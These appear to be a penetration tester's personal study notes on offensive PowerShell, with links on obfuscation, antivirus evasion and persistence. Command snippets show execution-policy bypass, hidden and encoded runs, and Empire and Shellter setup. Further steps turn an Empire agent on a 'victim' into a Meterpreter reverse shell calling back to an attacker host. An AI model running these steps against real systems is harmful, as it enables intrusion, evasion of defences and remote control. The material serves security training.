# PowerShell for Pentesters

## Recap:

#### Courses

- [John hammond powershell tuto playlist](https://www.youtube.com/playlist?list=PL1H1sBF1VAKXqO_N3ZNP0aL15miJcUhw7)
- [Powershell obfuscation in 3 min](https://www.youtube.com/watch?v=vIX5ZyzRy38&ab_channel=Hacktivity-ITSecurityFestival)
- [Powershell obfuscation](https://www.youtube.com/watch?v=6xexyQwG7SY&ab_channel=HackerSploit)
- [Powershell obfuscation manualy with github repo source](https://www.youtube.com/watch?v=tGFdmAh_lXE&ab_channel=t3l3machus)
- [shellter for antivirus evasion](https://www.youtube.com/watch?v=fPTKPobJjRY&ab_channel=SendiNovriadi)
- [Empire in 5 min](https://www.youtube.com/watch?v=3-cKDyyAGwc&ab_channel=HackerHankbook)
- [Empire](https://www.youtube.com/watch?v=52xkWbDMUUM&ab_channel=HackerSploit)
- [Empire from zero to hero (without pivoting)](https://www.youtube.com/watch?v=78I4fD0s6Ho&ab_channel=CYBERRANGES)
- [From empire to metasploit session (obselet i think based on new version of empire)](https://www.youtube.com/watch?v=nO2ZvjCea0U&ab_channel=Metasploitation)
- [Startkiller (Empire web interface)](https://www.youtube.com/watch?v=T00atUtARKE&ab_channel=MotasemHamdan)
- [Startkiller (Empire web interface) Post Exploit](https://www.youtube.com/watch?v=TgCQ5_EbM6Y&t=65s&ab_channel=CYBERRANGES)

### Articles

#### Blog and article ( facultatif but recommanded )

- [15 ways to bypass execution policy](https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/)
- [Powershell obfuscation article (same as the video)](https://hackersploit.org/windows-red-team-defense-evasion-techniques/)
- [Powershell obfscation repo](https://github.com/danielbohannon/Invoke-Obfuscation)
- [Empire pivoting](https://www.snaplabs.io/insights/lateral-movement-methods-and-good-practices)
- [Empire pivoting 2](https://ijustwannared.team/2018/02/10/empire-ception/)
- [Empire session to meterpreter 1](https://sixdub.medium.com/empire-tool-diversity-integration-is-key-bbb0dbc0af9f)
- [Empire session to meterpreter 2](https://www.youtube.com/watch?v=nO2ZvjCea0U&ab_channel=Metasploitation)
- [Empire with luckyStrike phishing scenario](https://www.youtube.com/watch?v=dRebw65X5eQ&ab_channel=HackerSploit)
- [Persistance with empire](https://www.hackingarticles.in/windows-persistence-with-powershell-empire/)
- [WMI persistance](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)

## Notes

##### Basics

```powershell
# bypass policy
powershell.exe -<ExecutionPolicy | ep> <Bypass | Unrestructer> <program.exe | calc.exe>

# hidden
powershell.exe -WindowStyle Hidden <program.exe | calc.exe>

# encode
powershell.exe -endocdedCommand <$var | string>


powershell.exe -Get-Service # to get sys infos and service running

## get alias ( tous les raccourcis : ls, dir....)
Get-Alias -Definition Get-ChildItem
## get process exe ( path)
Get-Process <ProcessName> | Sort-Object -Unique | Format-List Path

## get infos
Get-WmiObject -class win32_operationsystem | select -Property * | <apply other filter like:  Select-Object <property> >
# alternative to format-list :
fl


# modules ( extension .psm1)

# get all modules
Get-Module -List-Available

#import module
# powersploit
```

## Powershell with C2 and Obfuscation

- In order to evade antivirus, we could combine empire/startkiller stager with other framework like :
  - **Shellter and luckyStrike** to obfuscate or compromise native app

```bash
# install empire in kali
sudo apt install powershell-empire

# install anywhere
sudo apt-get update && sudo apt-get install powershell-empire startkiller -y

# lunch empire
sudo powershell-empire server
# then lunch the client
sudo powershell-empire client
# lunch web interface
startkiller # (in search bar)
# or
startkiller -no-sandbox # in terminal

# go explore empire and startkiller

# Shellter in kali: need wine because is exe
dpkg --add-architecture i386
apt update && apt install wine32
# install shellter
sudo apt install shellter
# download the shellter project and run
wine shellter
# or
shellter
```

### Empire process to get shell for noob :

- Lunch empire server
- Lunch empire client
- create listenner
- create stager
- run stager on victim
- get shell
- interact with agent
- run post exploit modules with : **usemodule**

```bash
# nmap by pivoting
usemodule powershell/situational_awareness/network/portscan
# set host and port
```

### From empire session to meterpreter :

```bash
# interact with the agent
interact agentName
# migrate
usemodule powershell/code_execution/invoke_shellcode
set LHOST <lhost>
set LPORT <lport>
set payload <payloadname | reverse_http>

# go on msfconsole
use exploit/multi/handler
set payload windows/meterpreter/<payload_name>
set LHOST <lhost>
set LPORT <lport>
set exitonsession false
exploit -j
# return on empire agent
execute


#alternative


# 1. go on msfconsole
use exploit/multi/script/web_delivery
set target 2
set SRVHOST <AttackIp>
set LHOST <AttackIp>
set payload windows/meterpreter/<payload_name>
exploit

# 2. go on empire
usemodule powershell/code_execution/invoke_metasploitpayload
set URL <Url From the exploit result>
execute

#3. Got shell
sessions
```
